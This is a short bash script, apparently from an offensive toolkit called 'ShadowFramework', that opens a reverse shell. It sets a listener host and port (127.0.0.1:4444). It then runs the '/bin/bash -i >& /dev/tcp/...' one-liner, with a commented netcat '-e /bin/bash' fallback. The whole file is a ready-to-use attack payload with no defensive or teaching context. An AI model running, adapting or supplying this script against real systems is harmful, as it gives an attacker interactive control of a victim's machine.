#!/bin/bash

# --- Configuration ---
LHOST="127.0.0.1"
LPORT="4444"
# ---------------------

echo "[*] ShadowFramework Reverse Shell starting..."
echo "[*] Target: $LHOST:$LPORT"

# Basic Bash Reverse Shell
/bin/bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1

# Alternative (Netcat) if bash fails
# nc -e /bin/bash $LHOST $LPORT
